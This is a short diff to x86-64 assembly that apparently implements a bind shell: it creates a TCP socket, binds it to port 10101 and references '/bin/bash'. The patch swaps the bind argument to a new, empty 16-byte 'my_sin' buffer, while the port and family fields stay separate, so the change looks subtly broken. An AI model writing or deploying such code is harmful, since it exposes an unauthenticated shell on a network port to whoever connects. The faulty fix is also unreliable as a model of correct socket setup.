@@ -1,8 +1,9 @@
 .data
     sockfd:     .quad 0
     fd:         .quad 0
+    my_sin:     .space 16         /* allocate 16 bytes for sockaddr_in structure */
     sin_family: .word 0
-    sin_port:   .word 0x7527  /* htons(10101) */
+    sin_port:   .word 0x7527      /* htons(10101) */
     sin_addr:   .quad 0
     sin_zero:   .quad 0
 
@@ -27,7 +28,7 @@ main:
     /* Bind socket */
     movq $SYS_BIND, %rax
     movq sockfd, %rdi
-    leaq sin, %rsi             /* address of sin structure */
+    leaq my_sin, %rsi          /* address of my_sin structure */
     movq $0x10, %rdx           /* sizeof(sockaddr_in) = 16 */
     syscall
 
@@ -83,3 +84,4 @@ main:
     SOCK_STREAM: .quad 1
     IPPROTO_TCP: .quad 6
     bash:        .asciz "/bin/bash"
+
